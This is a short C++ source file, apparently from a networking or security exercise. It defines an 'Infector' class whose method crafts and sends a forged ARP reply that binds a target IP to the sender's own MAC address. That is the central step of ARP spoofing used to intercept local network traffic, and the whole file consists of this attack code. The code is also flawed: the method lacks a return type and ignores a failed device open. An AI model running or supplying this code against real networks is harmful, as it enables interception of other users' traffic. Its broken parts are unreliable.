#include "infector.h"

Infector::Infector(IpFlow ipFlow) {

}

Infector::setArpPacket(IpFlow ipFlow) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(ipFlow.interface, 0, 0, 0, errbuf);

    if (pcap == nullptr) {
        fprintf(stderr, "[ERROR] couldn't open device %s(%s)\n", ipFlow.interface, errbuf);
    }

    EthArpPacket packet;
    Ip senderIp = ipFlow.sender_ip;
    Ip targetIp = ipFlow.target_ip;
    Mac senderMac = ipFlow.sender_mac;

    packet.eth_.dmac_ = senderMac;
    packet.eth_.smac_ = ipFlow.my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = ipFlow.my_mac;
    packet.arp_.sip_ = htonl(targetIp);
    packet.arp_.tmac_ = senderMac;
    packet.arp_.tip_ = htonl(senderIp);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "[ERROR] pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }

    printf("Sender: %s , Target: %s\n",
           std::string(senderIp).c_str(),
           std::string(targetIp).c_str());
}
